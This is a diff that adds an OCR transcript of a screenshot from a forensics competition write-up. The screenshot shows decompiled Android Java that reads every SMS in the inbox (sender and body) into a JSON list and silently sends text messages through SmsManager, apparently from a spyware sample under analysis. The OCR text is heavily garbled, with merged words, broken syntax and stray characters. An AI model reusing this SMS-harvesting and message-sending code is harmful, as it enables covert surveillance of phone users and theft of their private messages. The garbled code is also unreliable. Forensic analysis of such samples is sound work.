@@ -1,0 +1,25 @@
+# OCR: 56e04b80a587ff84802e354ba9f75c16.webp
+# 来源: ./02-WriteUp/2024/2024-美亚杯-团队赛/56e04b80a587ff84802e354ba9f75c16.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:20
+
+publicclassh
+publicstaticJsoNobjecta()
+try
+JsoNobjectjsoNobject=newJsoNobject() JsoNArrayjsoNArraynewJsoNArray();
+Cursorquery =MainService.getContextofApplication().getContentResolver().query(Uri.parse("content://sms/inbox"),null,null,null,null); while(query.moveToNext()）[
+JsoNobjectjsoNobject2newJsoNobject();
+String string - query-getstring(query-getcolumnIndex("address"));
+String string2  query-getstring(query-getColumnIndexOrThrow("body")); jsoNobject2.put("phoneNo",string);
+jsoNobject2.put("msg",string2); jsoNArray.put(jsoNobject2);
+jsoNArray);
+jsONObject.put("smsList", Log.e("done","collecting");
+returnjsonobject;
+catch(JSoNException e) e.printstackTrace();
+return null; 广
+publicstaticboolean
+b(stringstr,stringstr2)(
+try
+SmsManager.getDefault().sendTextMessage(str,null,str2,null,null): return true;
+catch(Exception e) e.printstackTrace(); return false;
+H
